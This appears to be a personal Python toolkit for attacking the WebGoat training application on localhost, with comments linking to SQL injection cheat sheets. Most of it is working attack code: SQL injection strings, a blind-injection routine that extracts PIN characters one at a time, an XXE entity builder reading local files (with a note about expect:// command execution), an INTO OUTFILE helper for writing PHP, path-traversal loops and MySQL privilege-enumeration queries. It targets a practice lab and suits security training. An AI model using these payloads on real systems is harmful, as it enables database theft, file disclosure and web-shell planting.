#http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
#http://www.spammimic.com/decode.cgi
#https://hexed.it/
#https://www.base64decode.org/
#https://github.com/ssllabs/research/wiki/SSL-and-TLS-Deployment-Best-Practices
#https://help.ubuntu.com/community/SSH/OpenSSH/Configuring
# javascript console: document
# javascript console : document.cookie="name=value"
# https://hc.apache.org/httpcomponents-client-4.5.x/examples.html
# https://github.com/zardus/ctf-tools
#dd if=yourfile ibs=1 skip=200 count=100

import urllib
import http.cookiejar
import urllib.request
import urllib.error

from http.cookiejar import Cookie, CookieJar 

class httpclient:
	def __init__(self):
		self.cookies = http.cookiejar.LWPCookieJar()
		self.handlers = [
			urllib.request.HTTPHandler(),
			urllib.request.HTTPSHandler(),
			urllib.request.HTTPCookieProcessor(self.cookies)
			]
		self.magic_inputs = ["'+'%'+'", "'", "' OR '1'='1", "#" , "1 or 1=1", "1' or 1=1#"]
		


	def decorate(self, request):
		# do nothing
		return

	def make_opener(self, uri, agent='Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'):
		opener = urllib.request.build_opener(*self.handlers)
		opener.addheaders = [('User-Agent', agent	)]
		opener.addheaders += [('Referer', uri)]
		return opener

	def fetch(self,uri, headers):
		req = urllib.request.Request(uri)
		self.decorate(req)
		opener = self.make_opener(uri)
		self.patch_headers(opener, headers)
		print(uri)
		print('<br><br>')
		
		return opener.open(req)

	def get(self,uri, data=dict(), headers=None):
		url_values = urllib.urlencode(data)
		uri = uri + '?' + url_values
		print(uri)
		print('<br><br>')
		req = urllib2.Request(uri)
		self.decorate(req)
		opener = self.make_opener(uri)
		self.patch_headers(opener, headers)
		return opener.open(req)

	# could not get it to work with opener. hope we can isolate all xml magic
	def post_with_body(self, uri, data, headers=None): # data - dict()
		req = urllib.request.Request(uri, data.encode('utf-8'))
		req.add_header('User-Agent','Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11')
		req.add_header('Referer',uri)
		for k, v in headers:
			req.add_header(k, v)
		self.decorate(req)
		print(uri)
		print('<br><br>')
		return urllib.request.urlopen(req)
		

	def post(self, uri, data = dict(), headers=None): # data - dict()
		data = urllib.parse.urlencode(data).encode('utf-8')
		req = urllib.request.Request(uri, data)
		self.decorate(req)
		opener = self.make_opener(uri)
		self.patch_headers(opener, headers)
		print(uri)
		print(data)
		print('<br><br>')
		
		return opener.open(req)


	def patch_headers(self, opener,headers):
		if (headers is None):
			return
		for k,v in headers:
			opener.addheaders = [ (ok,ov) if k != ok else (k,v) for ok, ov in opener.addheaders]
		opener.addheaders += [ (k, v) for k, v in headers if k not in opener.addheaders]

	def dump(self):
			for cookie in self.cookies:
				 print(cookie.name, cookie.value)
				 
	def make_cookie(name, value,domain=None):
# Cookie(version, name, value, port, port_specified, domain,
# domain_specified, domain_initial_dot, path, path_specified,
# secure, expires, discard, comment, comment_url, rest, rfc2109=False)	
		return Cookie(None, name, value, None, False, domain, False, False, '/', True, False, '1370002304', False, 'TestCookie', None, None, False)
	
	def query_limit(offset, count):
		return " LIMIT "+str(offset) + "," + str(count)
	
	def sleep_query(seconds):
		return " or sleep("+str(seconds) + ")"

	# write some php into outfile
	def write_file(content, outfile):
		return 'SELECT \'' + content + '\' into outfile ' + outfile

	# data getter (x,y) <- x,y - injectable parameter, e.g. query
	# confirm(x) <- data pass
	# iterable1 <- e.g. character position
	# iterable2 <- e.g. allowed characters
	def blind_check(self,data_getter, confirm, iterable1, iterable2):
		result = list()
		for i1 in iterable1:
			confirmed = False
			for i2 in iterable2:
				if (confirm(data_getter(i1,i2))):
					result.append(i2)
					confirmed = True
					break
			if (confirmed == False):
				return result
		return result
	
	def list_privileges():
		return """SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges; SELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv, Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user; SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges; SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges;"""
	
	def list_dba():
		return """SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'SUPER';SELECT host, user FROM mysql.user WHERE Super_priv = 'Y'; # priv"""
	
	def list_columns():
		return """SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'"""
	
	def list_tables():
		return """SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'"""

#php loves expect://id
	def do_xxe(self,xxe):
		return "<!DOCTYPE root [<!ENTITY foo SYSTEM \""+xxe+"\">]>"

	def shift(self,str, offset):
		return ''.join([ chr(ord(x) + offset) for x in str ])

cat = httpclient()
#cat.cookies.set_cookie(cat.make_cookie('JSESSIONID','A8A9EB6C28315BAE0E381B82CD81D894'))
#t = '../'
#for x in range(0, 10):
	#t = t + '../'
	#data = cat.get('http://localhost:8080/WebGoat/attack', {'Screen':308, 'menu':200, 'File': t + 'WebGoat\\WEB-INF/spring-security.xml', 'SUBMIT': 'View+File'}, {('Cookie','JSESSIONID=A8A9EB6C28315BAE0E381B82CD81D894')})
	#print(data.read())
	
#data = cat.get('http://localhost:8080/WebGoat/plugin_extracted/plugin/ClientSideFiltering/jsp/clientSideFiltering.jsp?userId=112', {}, {('Cookie','JSESSIONID=1453EBAA61291CAFCB0F015160D69D09')})
#print(data.read())

def xxe_example():
	data = cat.post_with_body('http://localhost:8080/WebGoat/attack?Screen=87365&menu=1700', 
		cat.do_xxe('file:///c:/')+"<searchForm>  <from>&foo;</from></searchForm>",  
			{('Cookie','JSESSIONID=1453EBAA61291CAFCB0F015160D69D09'), 
	#			('Referer', 'http://localhost:8080/WebGoat/start.mvc'), 
				('Accept', '*/*'), 
				('Accept-Encoding', 'en-US,en;q=0.5'), 
				('Accept-Language', 'gzip, deflate'), 
				('Content-Type', 'application/xml;charset=UTF-8')})
	print(data.read())

def blind_example():
		def confirm(data):
			return 'Account number is valid' in data

		def data_getter(pos,letter):
				data =  cat.get('http://localhost:8080/WebGoat/attack', 
					{'Screen':1315528047,'menu' :1100, 'SUBMIT' : 'Go!',
						'account_number' : '102 and (1=(SELECT COUNT(*) from pins where substr(name,' + str(pos) + ',1)=\''+chr(letter)+'\' and cc_number=\'4321432143214321\' ))'}, 
					 {('Cookie','JSESSIONID=1453EBAA61291CAFCB0F015160D69D09')}).read()
				print(data)
				return data

		letters = range(65, 123)
		positions = range(0, 60)

		discovery = cat.blind_check(data_getter, confirm, positions, letters)
		print([ chr(x) for x in discovery])


#print(cat.shift(reversed('alice'), 1))
for weak in cat.magic_inputs:
	data = cat.post('http://localhost:8080/WebGoat/attack?Screen=162777743&menu=3000', 
		{'Credit' : 'AMEX-33413003333', 'SUBMIT' : weak,'user' : weak }, 
		{('Cookie','JSESSIONID=1453EBAA61291CAFCB0F015160D69D09; user=\"eW91YXJldGhld2Vha2VzdGxpbms=\"')})
	print(data.read())
